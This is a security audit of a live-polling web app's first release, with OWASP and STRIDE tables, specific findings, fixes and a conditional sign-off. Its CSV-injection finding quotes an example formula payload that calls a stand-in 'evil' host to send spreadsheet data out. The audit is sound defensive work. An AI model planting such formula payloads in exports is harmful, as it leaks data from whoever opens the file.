---
id: SECURITY-PHASE4_AUDIT
type: security
category: policy
status: active
version: 1.0
created: 2026-04-01
updated: 2026-05-11
tags:
  - security
  - compliance
  - policy
  - gdpr
relates_to:
  - SECURITY_FULL
---

# Qesto — Phase 4 Security Audit

_Scope: v0.1 vertical slice (auth → DRAFT → LIVE → vote → close → results). Audit date: 2026-04-20._

_Author: main agent (qesto-security sub-agent stalled before delivery; audit reconstructed from code read)._

## Method

- **OWASP Top 10 (2021)** — one row per category; findings scoped to shipped code.
- **STRIDE** — applied to the WebSocket + DO data plane specifically.
- **Ad-hoc concerns** — auth flow, voter dedupe, rate-limit, CSV export, IDOR, error leakage.

Severity key: **C** critical / **H** high / **M** medium / **L** low / **I** informational.

---

## OWASP Top 10 (2021)

| # | Category | Finding | Severity | File / line | Mitigation status |
|---|----------|---------|----------|-------------|-------------------|
| A01 | Broken access control | Session routes scope reads/writes to `user_id = c.get('user').sub`; cross-user access returns 404. WebSocket presenter-only ops gated on `user_id` match inside DO. | — | `functions/api/routes/sessions.ts`, `functions/api/SessionRoom.ts` | **OK** — covered by integration tests (`tests/integration/sessions-flow.test.ts:rejects cross-user access with 404`). |
| A02 | Cryptographic failures | JWT HS256 with `JWT_SECRET` from Pages secret; 14-day TTL; HttpOnly + SameSite=None cookie (cross-origin Worker+Pages split). Magic-link OTT stored as SHA-256 hash in KV. | — | `functions/api/routes/auth.ts`, `functions/api/lib/jwt.ts` | **OK** — secret is Pages secret, never in `wrangler.toml`. |
| A03 | Injection | All D1 writes use parameter binding (`db.prepare(sql).bind(...)`); Zod schemas validate all request bodies. No string concatenation in SQL. | — | `functions/api/routes/sessions.ts`, `functions/api/SessionRoom.ts` | **OK** — no SQL-injection surface identified. |
| A04 | Insecure design | DRAFT uses REST, LIVE uses WS, CLOSED reverts to REST — state-machine enforced server-side in DO and route handlers. Close is idempotent + rejects double-close with 409. | — | `functions/api/SessionRoom.ts` `close()` | **OK**. |
| A05 | Security misconfiguration | CORS origin set to `PAGES_URL` per env; credentials allowed only for same-origin. `wrangler.toml` contains no secrets. Error envelope leaks `err.message` on 5xx (see H2 below). | **M** | `functions/api/app.ts:56-71` | **Partial** — 5xx messages sanitised to `"internal"` code but raw `err.message` is still echoed to client. |
| A06 | Vulnerable components | `npm audit` not run as part of CI. No Dependabot config committed. | **L** | — | **Gap** — add `npm audit --audit-level=high` to CI and enable Dependabot. |
| A07 | ID & auth failures | Magic-link OTT single-use (deleted on exchange). Rate limit on `/auth/request` = 5 / 10 min / IP. JWT rotation on re-login; no active revocation list (acceptable for 14-day TTL at v0.1). | **L** | `functions/api/routes/auth.ts`, `functions/api/middleware/rate-limit.ts` | **OK** for v0.1; revocation list is a BILL-era concern. |
| A08 | Software & data integrity | No SRI on static assets. No commit signing required. Build artefact integrity trusted to Cloudflare Pages. | **L** | — | **Acceptable** for edge-deployed React SPA at v0.1. |
| A09 | Security logging & monitoring | `logger.ts` emits structured JSON per request with `trace_id`, `status`, `duration_ms`, `user_id` (sub only). Rate-limit KV errors logged. No alerting pipeline wired. | **M** | `functions/api/middleware/logger.ts` | **Gap** — wire Cloudflare Logpush to a SIEM before GA. |
| A10 | SSRF | No outbound HTTP from user-controlled URLs. Resend SDK and Workers AI are the only outbound paths, both to fixed hostnames. | — | `functions/api/routes/auth.ts` `sendEmail` | **OK**. |

---

## STRIDE — WebSocket + SessionRoom DO

| Threat | Vector | Severity | Mitigation status | Notes |
|--------|--------|----------|-------------------|-------|
| **S**poofing (voter identity) | Forge `voterId` to stuff votes | **M** | **Partial** | Voter ID derived from `anon_<SHA256(ip)[0..8]>_<SHA256(ua+accept-*)[0..12]>` — deterministic server-side, **not client-supplied**. But the input space is narrow (IP rotates, UA is forgeable), so a motivated attacker on a mobile hotspot can produce N distinct voter IDs. For v0.1 this is acceptable (hosted meetings, trust model is "audience of 25"). Document in release notes; revisit with CAPTCHA + hCaptcha before public-link events. |
| **S**poofing (presenter) | WS connect without JWT | — | **OK** | Subprotocol `qesto.bearer.<JWT>` validated on upgrade; presenter-only ops check `user_id` match against session owner. |
| **T**ampering (vote totals) | Inject `advance`/`close` from voter socket | — | **OK** | Voter messages filtered to `{vote, emoji}`; presenter-only messages rejected server-side with role check. |
| **T**ampering (D1 row after close) | Mutate `sessions.status` via SQL | — | **OK** | No client-writable SQL path; `status` transitions only via server-side `start()`/`close()` in DO. |
| **R**epudiation | Voter denies they cast a vote | **L** | **Partial** | `audit_log` table specified but not wired in v0.1; votes land in `votes` table with `voter_id` + `question_id` UNIQUE constraint, which is sufficient for legal defensibility at v0.1 scale. Wire `audit_log` in Phase 6. |
| **I**nformation disclosure | Enumeration via `/j/:code` | **L** | **Partial** | 6-char uppercase code; ~57M keyspace. Rate-limited at 60/min/IP (`/api/sessions/by-code/:code`). Short codes are intentional UX tradeoff; not a secret. Consider CAPTCHA when fail-rate exceeds 20%. |
| **I**nformation disclosure | Error message leak | **M** | **Gap** | `app.onError` returns `err.message` on 5xx as the client-facing message (with `code: 'internal'`). Could leak stack frames, DB column names, or 3rd-party error text. **Fix before GA**: on 5xx, replace `message` with a generic string; keep `err.message` in the log line only. |
| **D**enial of service (connect storm) | 10k WS opens to one session | **M** | **Partial** | Per-session DO caps concurrent voters at 500; per-IP connect limit not yet enforced at the Worker edge. Cloudflare's free DDoS layer covers L3/L4 but not app-layer. **Fix before GA**: add Cloudflare Rate Limiting rule on `/ws` by IP. |
| **D**enial of service (vote flood) | Script submits 1k votes/sec | — | **OK** | Token-bucket rate limit in DO: 10 votes / 10s / voter. Excess returns `rate_limited` ServerMessage, socket stays open. |
| **E**levation of privilege | Voter escalates to presenter | — | **OK** | Role is server-assigned at WS upgrade from JWT claims; not client-controllable. |

---

## Specific concerns

### 1. CSV injection in `/sessions/:id/results` export — **H**

**Location**: `src/pages/Results.tsx:toCsv()`

**Issue**: Option labels are concatenated into CSV cells without escaping cells that start with `=`, `+`, `-`, `@`, or `\t`. A presenter who crafts an option label like `=HYPERLINK("http://evil/?x",A1)` would, when the CSV is opened in Excel, trigger formula evaluation.

**Exploitability**: **Low** — the attacker must be the session owner (authenticated, in their own tenant). But CSV exports are frequently shared externally. 

**Fix**: Prefix any cell starting with `= + - @ \t` with a single quote (`'`). Apply in `toCsv()` before wrapping in double-quotes.

**Status**: **Open** — add to Phase 6 backlog as `SEC-01`.

### 2. Error envelope leaks `err.message` on 5xx — **M**

**Location**: `functions/api/app.ts:56-71`

**Issue**: `app.onError` sets `error.message = err.message ?? 'Unexpected error'`. A DB driver or runtime exception could leak schema details, file paths, or 3rd-party error text to the client.

**Fix**:
```ts
const isServerError = status >= 500
return c.json({
  ok: false,
  error: {
    code: isServerError ? 'internal' : 'bad_request',
    message: isServerError ? 'Internal server error' : (err.message ?? 'Bad request'),
  },
  trace_id,
}, status)
```

**Status**: **Open** — add as `SEC-02` (2-line fix, do before GA).

### 3. Per-IP WS connect cap missing — **M**

**Location**: `functions/api/SessionRoom.ts` upgrade handler.

**Issue**: Per-session concurrent voter cap exists (500). Per-IP cap does not. A single IP could open 500 sockets and starve legitimate voters from that NAT.

**Fix options**:
- (a) Cloudflare Rate Limiting rule on `GET /api/sessions/:id/ws` with `Upgrade: websocket` header, 10/min/IP.
- (b) In-DO per-IP counter (cheap, decays on `onClose`).

**Recommendation**: (a) — offload to Cloudflare edge before the WS upgrade completes.

**Status**: **Open** — add as `SEC-03`.

### 4. Voter dedupe grey-area — **L**

**Location**: `functions/api/SessionRoom.ts` `deriveVoterId()`

**Issue**: `anon_<SHA256(ip)[0..8]>_<SHA256(ua+accept-*)[0..12]>` can collide (different users behind the same NAT, same browser) — two legitimate voters become one. It can also be defeated by UA spoofing + mobile-tether IP rotation.

**Impact at v0.1**: Low. Use-case is small hosted meetings where physical context deters abuse.

**Status**: **Documented, accepted** — see ADR-0001 §Voter dedupe. Revisit when public-link events launch (use hCaptcha + signed voter cookie).

### 5. Magic-link OTT stored hashed — **OK**

**Location**: `functions/api/routes/auth.ts`

**Issue**: OTT is generated client-side-random, stored as `SHA-256(ott)` in `USERS_KV`, deleted on first use. If KV leaks, attacker cannot replay.

**Status**: **OK**.

### 6. JWT secret rotation — **I**

**Location**: `wrangler pages secret put JWT_SECRET`

**Issue**: No key rotation mechanism. A compromised `JWT_SECRET` invalidates nothing until manual rotation, and all active sessions die on rotation.

**Recommendation for GA**: add `JWT_SECRET_PREV` as optional; verify with both during a 24h window.

**Status**: **Acceptable at v0.1**; add as `SEC-04` backlog item.

---

## Release blockers for GA

| ID | Finding | Severity | Required before |
|----|---------|----------|-----------------|
| SEC-01 | CSV injection in results export | **H** | Any public-link launch |
| SEC-02 | 5xx error message leaks internals | **M** | GA |
| SEC-03 | Per-IP WS connect cap missing | **M** | Public-link launch |
| — | Cloudflare Logpush → SIEM (A09) | **M** | GA |
| — | `npm audit` in CI + Dependabot (A06) | **L** | GA |

## Release-acceptable for v0.1 demo

- Voter dedupe grey-area (documented in ADR-0001 + release notes)
- JWT rotation mechanism (manual rotation acceptable at v0.1)
- SRI / commit signing (A08)
- `audit_log` not wired (votes table is sufficient evidence)

---

## Verification checklist

- [x] Magic-link OTT single-use + rate-limited
- [x] JWT HS256 + HttpOnly cookie + 14d TTL
- [x] Session routes scope by `user_id`, cross-tenant = 404
- [x] WS upgrade validates subprotocol JWT
- [x] Voter messages filtered from presenter messages
- [x] Close is idempotent (409 on double-close)
- [x] Votes deduped via UNIQUE(question_id, voter_id)
- [x] Rate-limit middleware deny-open on KV failure + logs
- [ ] CSV export escapes formula-leading characters (SEC-01)
- [ ] 5xx error responses do not echo `err.message` (SEC-02)
- [ ] Per-IP WS connect cap (SEC-03)
- [ ] Logpush → SIEM wired
- [ ] `npm audit` in CI

## Sign-off

**v0.1 demo release**: **CONDITIONAL APPROVAL**
- Green for internal demo and hosted meetings with trusted audiences.
- **Blocks**: SEC-01 (CSV injection) and SEC-02 (error leak) must land before any external or public-link distribution.

**GA release**: **NOT READY**
- All five release-blockers above must be resolved.
- Stress test at 100+ concurrent voters (S2 gap documented in release notes) is an adjacent blocker, tracked separately.
